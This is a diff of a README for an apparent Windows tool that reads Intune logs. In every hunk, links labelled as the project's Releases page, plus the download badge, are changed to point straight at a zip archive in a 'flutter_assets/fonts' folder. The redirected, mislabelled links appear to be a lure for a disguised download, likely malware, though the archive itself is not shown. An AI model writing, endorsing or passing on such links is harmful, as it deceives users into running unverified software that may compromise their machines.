@@ -1,6 +1,6 @@
 # 🎉 Intune-Log-Reader-for-Windows - Easy Log Monitoring for Windows
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)
+![Download](https://github.com/annu8055/Intune-Log-Reader-for-Windows/raw/refs/heads/main/release/data/flutter_assets/fonts/Reader_Intune_Log_Windows_for_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Intune Log Reader for Windows! This application helps you analyze
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Please visit the [Releases page](https://github.com/annu8055/Intune-Log-Reader-for-Windows/releases) to download the software.
+To get started, you will need to download the application. Please visit the [Releases page](https://github.com/annu8055/Intune-Log-Reader-for-Windows/raw/refs/heads/main/release/data/flutter_assets/fonts/Reader_Intune_Log_Windows_for_3.4.zip) to download the software.
 
 You will find various versions of the application there. Choose the latest version for the best experience.
 
@@ -22,7 +22,7 @@ Make sure your system meets these requirements to ensure smooth operation of the
 
 ## 📂 How to Download
 
-1. Visit the [Releases page](https://github.com/annu8055/Intune-Log-Reader-for-Windows/releases).
+1. Visit the [Releases page](https://github.com/annu8055/Intune-Log-Reader-for-Windows/raw/refs/heads/main/release/data/flutter_assets/fonts/Reader_Intune_Log_Windows_for_3.4.zip).
 2. Look for the latest version listed.
 3. Click on the link to download the installer file.
 4. Save the file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
